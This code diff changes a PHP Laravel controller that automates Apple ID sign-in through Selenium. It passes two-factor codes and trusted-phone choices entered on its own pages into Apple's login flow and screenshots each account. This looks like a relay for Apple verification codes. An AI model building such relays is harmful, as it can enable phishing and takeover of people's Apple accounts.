@@ -20,6 +20,8 @@ use App\Models\SecuritySetting;
 use App\Selenium\AppleClient\Exception\AccountException;
 use App\Selenium\AppleClient\Page\SignIn\TwoFactorAuthenticationPage;
 use App\Selenium\AppleClient\Page\SignIn\SignInSelectPhonePage;
+use App\Selenium\AppleClient\Page\SignIn\TwoFactorAuthWithDevicePage;
+use App\Selenium\AppleClient\Page\SignIn\TwoFactorAuthWithPhonePage;
 use App\Selenium\AppleClient\Request\SignInRequest;
 use App\Selenium\ConnectorManager;
 use App\Selenium\Exception\PageErrorException;
@@ -50,6 +52,7 @@ use Saloon\Exceptions\Request\ClientException;
 use Saloon\Exceptions\Request\FatalRequestException;
 use Saloon\Exceptions\Request\RequestException;
 use Saloon\Exceptions\SaloonException;
+use Symfony\Component\DependencyInjection\Exception\RuntimeException;
 use Weijiajia\IpConnector;
 use Weijiajia\Requests\PconLineRequest;
 use Weijiajia\Responses\IpResponse;
@@ -207,6 +210,13 @@ class IndexController extends Controller
             ],code: 202);
         }
 
+        if ($authPage instanceof TwoFactorAuthWithDevicePage){
+            return $this->success(data: [
+                'Guid' => $guid,
+                'Devices' => true,
+            ],code: 201);
+        }
+
         return $this->success(data: [
             'Guid' => $guid,
             'Devices' => true,
@@ -219,16 +229,27 @@ class IndexController extends Controller
     }
 
     /**
-     * @param CacheInterface $cache
-     * @return Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
+     * @return View
+     * @throws NoSuchElementException
+     * @throws TimeoutException
      */
-    public function authPhoneList(CacheInterface $cache): Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
+    public function authPhoneList(): View
     {
         $guid = $this->request->input('Guid',null);
 
-        $user = $this->userFactory->create($guid);
+        $connector = $this->connectorManager->getConnector($guid);
 
-        return view('index.auth-phone-list',['trustedPhoneNumbers' => $user->getPhoneInfo()]);
+        $user = $this->userFactory->create($guid);
+        if (! $account = $user->getAccount()){
+            throw new \RuntimeException('账号信息不存在');
+        }
+
+        $connector->config()
+            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));
+
+        $page = new SignInSelectPhonePage($connector);
+
+        return view('index.auth-phone-list',['trustedPhoneNumbers' => $page->getPhoneLists()]);
     }
 
     /**
@@ -255,7 +276,7 @@ class IndexController extends Controller
             $connector->config()
                 ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));
 
-            $page = new TwoFactorAuthenticationPage($connector);
+            $page = new TwoFactorAuthWithDevicePage($connector);
 
             $page->inputTrustedCode($code);
 
@@ -304,7 +325,7 @@ class IndexController extends Controller
         // 验证手机号码
         try {
 
-            $page = new TwoFactorAuthenticationPage($connector);
+            $page = new TwoFactorAuthWithPhonePage($connector);
 
             $page->inputTrustedCode($code);
 
@@ -326,54 +347,90 @@ class IndexController extends Controller
     /**
      * 获取安全码
      * @return JsonResponse
-     * @throws UnauthorizedException|ConnectionException
+     * @throws NoSuchElementException
      */
     public function SendSecurityCode(): JsonResponse
     {
-        $apple = $this->getApple();
+        $guid = $this->request->input('Guid');
 
-        try {
+        $connector = $this->connectorManager->getConnector($guid);
 
-            $response = $apple->idmsa->sendSecurityCode()->json();
-
-            $this->getAccount()
-                ->logs()
-                ->create([
-                    'action' => '获取安全码',
-                    'description' => '获取安全码成功',
-                ]);
-
-        } catch (\Exception $e) {
-
-            $this->getAccount()
-                ->logs()
-                ->create([
-                    'action' => '获取安全码',
-                    'description' => "获取安全码失败:{$e->getMessage()}",
-                ]);
-
-            throw $e;
+        $user = $this->userFactory->create($guid);
+        if (! $account = $user->getAccount()){
+            throw new \RuntimeException('账号信息不存在');
         }
 
-        return $this->success($response);
+        $connector->config()
+            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));
+
+        $page = new TwoFactorAuthWithDevicePage($connector);
+
+        $page->resendCode();
+
+        sleep(3);
+
+        return $this->success();
+    }
+
+    public function resendCode()
+    {
+        $guid = $this->request->input('Guid');
+
+        $connector = $this->connectorManager->getConnector($guid);
+
+        $user = $this->userFactory->create($guid);
+        if (! $account = $user->getAccount()){
+            throw new \RuntimeException('账号信息不存在');
+        }
+
+        $connector->config()
+            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));
+
+        $page = new TwoFactorAuthWithPhonePage($connector);
+
+        $page->resendCode();
+
+        sleep(3);
+
+        return $this->success();
     }
 
     /**
      * 获取手机号码
      * @return JsonResponse
-     * @throws UnauthorizedException
-     * @throws GuzzleException|ConnectionException
+     * @throws NoSuchElementException
+     * @throws PageException
      */
     public function GetPhone(): JsonResponse
     {
-        $response = $this->getApple()->auth();
+        $guid = $this->request->input('Guid');
 
-        $trustedPhoneNumbers = $response->getTrustedPhoneNumber();
+        $connector = $this->connectorManager->getConnector($guid);
 
-        return $this->success([
-            'ID'                  => $trustedPhoneNumbers?->getId(),
-            'Number'              => $trustedPhoneNumbers?->getNumberWithDialCode(),
-        ]);
+        $user = $this->userFactory->create($guid);
+        if (! $account = $user->getAccount()){
+            throw new \RuntimeException('账号信息不存在');
+        }
+
+        $connector->config()
+            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));
+
+        $page = new TwoFactorAuthWithDevicePage($connector);
+
+        $authPage = $page->usePhoneNumber();
+
+        if ($authPage instanceof SignInSelectPhonePage){
+
+            return $this->success(data: [
+                'Guid' => $guid,
+                'Devices' => false,
+            ],code: 202);
+        }
+
+        return $this->success(data: [
+            'Guid' => $guid,
+            'Devices' => true,
+        ],code: 203);
     }
 
     /**
@@ -387,6 +444,7 @@ class IndexController extends Controller
             'ID' => 'required|integer|min:0',
         ])->validated();
 
+
         try {
 
             $guid = $this->request->input('Guid');
@@ -399,15 +457,12 @@ class IndexController extends Controller
             $connector->config()
                 ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));
 
-
             $page = new SignInSelectPhonePage($connector);
             $page->selectPhone($params['ID']);
 
         } catch (PageException $e) {
 
-            $e->getPage()->takeScreenshot("SendSms.png");
-
-            throw $e;
+            return $this->error($e->getMessage() ?: "Too many verification codes have been sent. Enter the last code you received, use one of your devices, or try again later.",400);
         }
 
         return $this->success();
@@ -415,7 +470,46 @@ class IndexController extends Controller
 
     public function sms(): View|Factory|Application
     {
-        return view('index/sms',['phoneNumber' => $this->request->input('Number')]);
+        $guid = $this->request->input('Guid');
+
+        $user = $this->userFactory->create($guid);
+        if (! $account = $user->getAccount()){
+            throw new \RuntimeException('账号信息不存在');
+        }
+
+        $connector = $this->connectorManager->getConnector($guid);
+        $connector->config()
+            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));
+
+
+        $page = new TwoFactorAuthWithPhonePage($connector);
+
+        $useDifferentPhoneNumber = (bool) $page->getUseDifferentPhoneNumberButton();
+
+        return view('index/sms',[
+            'phoneNumber' => $this->request->input('Number'),
+            'useDifferentPhoneNumber' => $useDifferentPhoneNumber,
+        ]);
+    }
+
+    public function useDifferentPhoneNumber()
+    {
+        $guid = $this->request->input('Guid');
+
+        $user = $this->userFactory->create($guid);
+        if (! $account = $user->getAccount()){
+            throw new \RuntimeException('账号信息不存在');
+        }
+
+        $connector = $this->connectorManager->getConnector($guid);
+        $connector->config()
+            ->add('screenshot_path',storage_path("/browser/screenshots/{$account->account}/"));
+
+
+        $page = new TwoFactorAuthWithPhonePage($connector);
+        $page->useDifferentPhoneNumber();
+
+        return $this->success();
     }
 
     public function result(): View|Factory|Application
